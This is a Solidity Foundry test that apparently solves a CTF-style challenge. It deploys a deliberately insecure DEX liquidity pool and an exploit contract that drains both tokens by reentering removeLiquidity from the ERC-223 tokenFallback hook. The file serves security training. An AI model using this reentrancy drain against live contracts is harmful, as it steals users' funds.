// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./InsecureDexLP.sol";
import "../tokens/tokenInsecureum.sol";
import "../tokens/tokenERC223.sol";

contract InsecureDexLPExploitTest is Test {
    address setupAddress = makeAddr("setup");
    address playerAddress = makeAddr("player");
    InSecureumToken token0;
    SimpleERC223Token token1;
    InsecureDexLP target;

    function setUp() public {
        vm.startPrank(setupAddress, setupAddress); // for ERC-223
        token0 = new InSecureumToken(10 ether);
        token1 = new SimpleERC223Token(10 ether);
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(playerAddress, 1 ether);
        token1.transfer(playerAddress, 1 ether);
        vm.stopPrank();
    }

    function test() public {
        vm.startPrank(playerAddress, playerAddress);

        InsecureDexLPExploit exploit = new InsecureDexLPExploit();
        token0.transfer(address(exploit), 1 ether);
        token1.transfer(address(exploit), 1 ether);
        exploit.exploit(target);

        vm.stopPrank();
        assertEq(token0.balanceOf(playerAddress), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(playerAddress), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");
    }
}

contract InsecureDexLPExploit {
    uint256 totalRecieved = 0;
    bool underExploit = false;

    function exploit(InsecureDexLP target) external {
        underExploit = true;

        IERC20 token0 = target.token0();
        IERC20 token1 = target.token1();

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);

        target.addLiquidity(1 ether, 1 ether);
        target.removeLiquidity(target.balanceOf(address(this)));

        token0.transfer(msg.sender, 10 ether);
        token1.transfer(msg.sender, 10 ether);

        underExploit = false;
    }

    function tokenFallback(address from, uint256 amount, bytes memory) external {
        if (!underExploit) {
            return;
        }
        totalRecieved += amount;
        if (totalRecieved < 10 ether) {
            InsecureDexLP target = InsecureDexLP(from);
            target.removeLiquidity(target.balanceOf(address(this)));
        }
    }
}
